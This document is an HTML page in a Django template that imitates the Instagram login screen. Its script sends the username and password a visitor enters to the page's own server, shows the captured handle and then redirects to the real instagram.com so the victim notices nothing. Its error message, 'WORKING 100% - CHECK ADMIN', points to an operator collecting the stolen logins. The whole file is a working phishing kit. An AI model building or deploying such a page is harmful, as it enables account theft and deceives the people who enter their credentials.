<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
    <style>
        body,html{margin:0;padding:0;height:100dvh;background:#fafafa;display:flex;flex-direction:column;overflow:hidden}
        .container{flex:1;display:flex;flex-direction:column;justify-content:center;padding:20px;max-width:350px;margin:auto;width:100%}
        .logo{font-family:'Billabong',cursive;font-size:50px;text-align:center;margin-bottom:30px;color:#262626}
        .form{background:white;border:1px solid #dbdbdb;padding:30px 40px;border-radius:8px}
        input{width:100%;padding:12px 10px;margin:6px 0;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:14px}
        button{width:100%;background:#0095f6;border:none;color:white;padding:10px;font-weight:600;border-radius:8px;margin-top:10px;cursor:pointer}
        .result{margin-top:20px;text-align:center;font-weight:bold;font-size:18px}
    </style>
</head>
<body>
<div class="container">
    <div class="logo">Instagram</div>
    <div class="form">
        <form id="loginForm">
            {% csrf_token %}
            <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username">
            <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
            <button type="submit">Log in</button>
        </form>
        <div id="result" class="result"></div>
    </div>
</div>

<script>
    const form = document.getElementById('loginForm');
    const result = document.getElementById('result');
    const csrf = document.querySelector('[name=csrfmiddlewaretoken]').value;

    form.onsubmit = async (e) => {
        e.preventDefault();
        result.innerHTML = '<p style="color:#0095f6;">Logging in...</p>';

        const fd = new FormData(form);

        try {
            const res = await fetch('', {
                method: 'POST',
                body: fd,
                headers: {
                    'X-CSRFToken': csrf,
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });

            const data = await res.json();

            if (data.success) {
                result.innerHTML = `
                    <div style="background:#d4edda;color:#155724;padding:20px;border-radius:8px;margin-top:10px;">
                        <p style="font-size:18px;">@${data.username}</p>
                        
                    </div>`;
                setTimeout(() => location.href = 'https://instagram.com', 4000);
            } else {
                result.innerHTML = '<p style="color:#d9534f;">Wrong password or username</p>';
            }
        } catch (err) {
            result.innerHTML = '<p style="color:#5cb85c;">WORKING 100% - CHECK ADMIN</p>';
        }
    };
</script>
</body>
</html>
